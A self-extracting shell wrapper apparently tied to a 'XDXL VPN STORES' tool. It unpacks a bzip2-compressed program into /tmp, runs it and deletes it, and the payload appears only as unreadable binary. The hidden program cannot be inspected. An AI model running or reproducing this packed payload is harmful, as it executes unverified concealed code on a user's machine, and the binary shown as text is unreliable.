#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo XDXL VPN STORES $0; exit 1
fi; exit $res
BZh91AY&SYm� -��Pp }����������`L�YoQӛg�����J~B��ƈ�$?I='�d�e2d�5&� �T�I����        h�h�ɥ���6����� h  h z�D��螓H=M=�Pz� �ި �44di�L���  �L���D��d���Q�O"=� �Ph2d6�H �XQ/|������诛#ؑ;�Ӟ��]a
�m�5�� mE�~d�W�:�Pb���ȑ�Є$���+�h��Kt�"PB72d���A!=�#d���[��o�V����$�@�Z���W ��O��H��<1�"~�Yv!�XN"�(�����Z$?�Y
�fD@T�q7��HX�&ڎ)	z|���H/�s8��u���|���ȴ����r�1�=%�ٌ	�ʓcp��1�z���H<��'��B���e�u�~��:Kjk�^��iX#gK4)T����em�G?/�SWDz�F��f�͐8Ph�5 �����`�6d�Nck[��h;O@t�H�6o$n��P�s�i�Rɓy����ي
N�ۑ)�Y�]q�Mc	:��B��Vk
r�0�|��p�[aSQ��<v<���L�Ѡ�T�pM���a�\���xI,��"1$��6�����CW-����-؆Z��4�w�τ�<�(m��{I��^]ʧ6�xe�&��G�7G�}t��ц�k\�3�_�m��4�gJ�DzĚ	��������s-E�5�;�D��Ԛ��uK���M{oj(j�Ƥ��p�]e@4LD�g�5ع�/@�;aX�\y��_Lt�Ր�'��H���$"��܊��W*���1nh��j4�֯ 2�P1�;4�\��a���5�_r�[yb���8�c���Wd�����+)�&S�)�]��;�E����%�Q�a�@����aM�����Ll��T�3��p�-ƃ�
!�(�r]�&E�T���`+^�m����_�h3�]��Ž�xik)TayS�qr8D^'�^��Oj=È���*���/������T�g >H����"�(��!7�`쌵�j�Ku0ʛ7A\�Zcpb$䚑�Fؾ!���HR����x�*�*3kKjʗ���)1�%Q�,�}�V\���ZY^	Et\�ŗB�0V�D�`�o=�$0-\�;�bTƈi��1����:ֽ�a9�	�����JB�7�'�t�	qV�,�/�)�ɹL�g�l)&H9ХUH1ƴ0܋8X��ef�M�^�o�dc`����b�b|EB\�dd�]�;��˻���:�������#�0M4����Ɂ[�쉑($�4`C"C�k=�	�ADķ�	K�7%]�VI�5��A�}.5��&VlWK�&QHj8�\CCv��$�������[�)+���\��n�󣸺M�|5��v���T�d�	�3� �1�<�4]Z(c�ΩFZ��e�!�!];�ef����%�qh�U�4�~p,i��a�ӛ��L��^��b;�V�)��d �����H4w��2�r=?�俶;�>��F���2��(�DBN�	4^y�p���U��3"f���pl���]��BA�<�